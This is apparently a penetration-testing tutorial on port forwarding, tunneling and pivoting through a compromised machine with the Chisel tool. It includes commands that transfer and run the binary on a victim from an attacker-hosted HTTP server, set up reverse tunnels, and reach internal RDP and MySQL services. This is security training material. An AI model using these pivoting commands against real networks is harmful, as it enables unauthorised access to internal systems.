
Learn how to access internal services through a compromised machine using:
- Port Forwarding
- Tunneling
- Pivoting

**This is used when:**
- the target network has internal-only systems
- ports are blocked by firewall
- you have access to one machine and want to reach deeper machines

## 1) Port Forwarding
Redirect one port to another machine.

Example:
- You access: `127.0.0.1:8080`
- It forwards to: `10.10.10.20:80`

---

## 2) Tunneling
Creating a path through a blocked network using a proxy/tunnel.

---

## 3) Pivoting
Using a compromised machine as a "bridge" to attack deeper internal machines.


# 01: Port Redirection and Tunneling Using Chisel

## Chisel
Chisel is a fast TCP/HTTP tunneling tool.
Chisel is used for tunneling + pivoting

**It creates a tunnel between:**
- Attacker (Kali)
- Victim (compromised machine)
```
Architecture:
┌──────────────┐         HTTP(S)          ┌──────────────┐
│ Chisel       │◄──────────────────────────┤ Chisel       │
│ Client       │      Encrypted Tunnel     │ Server       │
└──────────────┘                           └──────────────┘
      │                                           │
      │                                           │
   Local App                               Remote Service
```

**So you can access internal network services like:**
- RDP (3389)
- SMB (445)
- WinRM (5985)
- HTTP (80/443)
- MSSQL (1433)


#### Need of Tunneling
```
Scenario 1: Firewall Blocking
├── Internal server has SSH (port 22)
├── Firewall blocks port 22 from outside
└── Solution: Tunnel through allowed port (80/443)

Scenario 2: Pivoting
├── You compromised Machine A
├── Machine A can reach Machine B
├── You cannot directly reach Machine B
└── Solution: Tunnel through Machine A

Scenario 3: Bypassing Network Restrictions
├── Company blocks certain websites/ports
├── You have access to external server
└── Solution: Tunnel traffic through your server
```

#### Types of Port Forwarding
```
LOCAL PORT FORWARDING:
Your PC ──→ Tunnel ──→ Target Server ──→ Internal Service
(Port 8080)        (Port 22)         (Port 3306)

REVERSE PORT FORWARDING:
Target Server ──→ Tunnel ──→ Your PC ──→ Internet
(Internal)              (Port 8080)    (Blocked service)

SOCKS PROXY:
Your Apps ──→ SOCKS Proxy ──→ Tunnel ──→ Target Network
(Browser)    (Port 1080)              (All services)
```


##  Installation and Setup
### Download Chisel
#### Method 1: Pre-compiled Binaries (Recommended)
```bash
# Download latest release
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz

# Extract
gunzip chisel_1.9.1_linux_amd64.gz

# Make executable
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# Verify
./chisel --version
```

#### Method 2: Using APT (Kali Linux)
```bash
sudo apt update
sudo apt install chisel -y
```

## Transfer Chisel to Target
#### Using Python HTTP Server
```
# On Kali (attacker machine)
python3 -m http.server 8000

# On target
wget http://10.10.10.5:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

**Because Chisel works like a tunnel bridge:**

1) Chisel Server (runs on Kali)
- waits for a connection
- creates the tunnel endpoint on attacker side

1) Chisel Client (runs on Windows)
- connects back to Kali
- forwards internal ports through itself

**example:**
- You (Kali) cannot access internal service: `10.10.10.20:80`
- But the compromised Windows machine can access it


##  Forward Port Forwarding (Local)

**Goal:** Access a remote service through a local port
```
Your Machine          Chisel Server          Target Service
   (Local)      ──────►  (Tunnel)  ──────►   (Remote)
localhost:8080        10.10.10.100        192.168.1.50:3306
```

### setup chisel 
```
# Server side
chisel server --port 9000 --reverse

# Client side
chisel client <server_ip>:9000 <local_port>:<target_ip>:<target_port>
```

## Example 2: Access Remote RDP
```bash
# Server (pivot machine)
chisel server --port 9000 --reverse

# Client (your machine)
chisel client 10.10.10.100:9000 3389:192.168.1.100:3389

# Connect using RDP client
rdesktop localhost:3389
# Or
xfreerdp /u:Administrator /p:Password /v:localhost:3389
```


## Example 1: Access Remote MySQL Database

**Scenario:**
- MySQL runs on 192.168.1.50:3306 (only accessible from 10.10.10.100)
- You want to access it from your Kali machine (10.10.10.5)

**Solution:**
```
# Step 1: Start Chisel server on pivot machine (10.10.10.100)
chisel server --port 9000 --reverse

# Step 2: On your Kali machine (10.10.10.5)
chisel client 10.10.10.100:9000 8080:192.168.1.50:3306

# Step 3: Connect to MySQL via localhost
mysql -h 127.0.0.1 -P 8080 -u root -p
```

**Breakdown:**
- 8080 = Local port on your Kali machine
- 192.168.1.50:3306 = Remote MySQL server
- Traffic to localhost:8080 → tunneled → 192.168.1.50:3306


___


#  Reverse Port Forwarding (Remote)

The victim machine opens a port, and traffic coming to that port is forwarded back to the attacker (or another system).

**Goal:** Expose a service on target machine to your attacker machine
```
Attacker Machine     Chisel Client        Target Machine
   (Receiver)    ◄────── (Tunnel) ◄──────  (Sender)
localhost:8080        Connection        Internal Service
```
**Use Case:** Target can't reach you directly (firewall blocks incoming)
